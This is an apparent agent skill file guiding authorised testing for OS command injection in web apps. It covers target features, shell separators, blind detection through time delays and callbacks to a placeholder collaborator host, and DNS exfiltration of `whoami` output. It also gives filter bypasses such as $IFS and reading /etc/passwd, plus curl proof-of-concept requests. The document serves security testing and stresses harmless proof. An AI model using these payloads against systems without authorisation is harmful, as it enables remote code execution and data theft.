---
name: os-command-injection
description: Detect and prove OS command injection (shell injection / RCE) in web apps where user input feeds an OS command. Use when a parameter looks like it shells out — ping/traceroute/nslookup network tools, file or image conversion (ImageMagick, ffmpeg, pdf), backups, exports, archive extraction, or admin utilities; when you can try separators ; | & && || $() backticks or newline; for blind command injection confirmed via time delays or OAST (DNS+HTTP) callbacks.
---

# OS Command Injection

> **Prereq — map first:** Don't test this cold. A target attack-surface map and the relevant happy-flow baseline must exist first — run `/recon-mapper` if not. Test this class against the impact-scored candidate list (highest priority first), reuse the routed `handoff_context`, and pursue chains to real business impact over isolated low-severity bugs.


Execute OS commands on the server by injecting shell metacharacters into input that an app passes to a shell. Top-tier impact: leads to full server compromise (RCE).

## When to test
Hunt features that plausibly shell out to the OS:
- Network/diagnostic tools: ping, traceroute, nslookup, whois, DNS lookups, port checkers.
- File/media processing: image resize/convert (ImageMagick), video transcode (ffmpeg), PDF/office conversion, thumbnailing, OCR.
- Exports & archives: ZIP/tar create or extract, CSV/PDF generation, log download.
- Admin/system utilities: backups, "run diagnostics", git operations, package installs, scheduled jobs.
- Any param holding a hostname, IP, filename, path, URL, or format flag.

## Impact & priority
RCE = P1 / top-tier. Code execution on the host typically means full read/write to app data, secrets, lateral movement, and pivot into internal infra. This is among the highest-signal findings — always report a proven one.

## Detection
1. Inject a separator + harmless command after a value that already works (e.g. a valid IP for ping).
   - In-band: look for command output (e.g. `id` / `whoami`) appearing in the response.
   - Try each separator: `;`  `|`  `||`  `&`  `&&`  `` ` ` ``  `$( )`  and a literal newline (`%0a`).
2. Blind (no output reflected):
   - Time delay: inject `ping -c 10 127.0.0.1` (Unix) / `ping -n 10 127.0.0.1` (Win) or `sleep 10`; confirm the response is delayed by ~that amount. Re-test with a different delay to rule out noise.
   - OAST (best): trigger a DNS + HTTP callback to your collaborator host with `nslookup <id>.oast.example` or `curl http://<id>.oast.example`. A received DNS/HTTP hit proves execution even with no reflected output.
   - Output redirection: write `whoami` to a file under the web root and fetch it (e.g. `> /var/www/static/o.txt` then GET `/o.txt`).

## Exploitation
- Separators chain your command onto the intended one. Wrapping with leading/trailing separators (e.g. `& injected &`) helps when your input sits mid-command.
- Prove execution with a HARMLESS command only: `id`, `whoami`, `uname -a` (Unix); `whoami`, `ver` (Windows). Never run destructive payloads.
- Capture output in-band where reflected; otherwise exfiltrate via OAST, e.g. `nslookup `whoami`.<id>.oast.example` to leak the username into the DNS log.
- Stop at proof. Do not escalate beyond the minimum needed to demonstrate code execution.

## Common bypasses
- Blocked spaces: use `$IFS`, `${IFS}`, brace expansion `{cat,/etc/passwd}`, or `<` redirection; `$IFS$9` is a common variant.
- Filtered chars: try URL/hex encoding, a literal newline (`%0a`) as a separator, quotes inside tokens (`w'h'oami`), or backslashes (`who\ami`).
- Restricted commands / WAF: prefer OAST so no output filtering applies. See `reference.md` for the full bypass and metacharacter tables.

## Minimal PoC (for ./_EXPLOIT/)
In-band, proving `id` runs via a `;` separator in a ping-style param:

```bash
curl 'https://TARGET/api/ping?host=127.0.0.1;id'
# Response includes: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Blind via OAST (no reflected output):

```bash
curl 'https://TARGET/api/ping?host=127.0.0.1%26nslookup%20$(whoami).abcd1234.oast.example%26'
# Collaborator shows a DNS lookup for www-data.abcd1234.oast.example  -> proven RCE
```

Log to `./_EXPLOIT/` with the exact request, the separator used, and the proof (reflected `id` output or the collaborator DNS/HTTP hit).

## Don't report as noise
- Error/stack-trace messages alone, with no evidence a command actually ran.
- Reflected input or "the param looks dangerous" without a confirmed callback or output.
- Theoretical injection blocked by validation. Only report PROVEN execution.

## Deep reference
See `reference.md` for command tables, separator matrix, blind/OAST detail, and prevention. Source: https://portswigger.net/web-security/os-command-injection
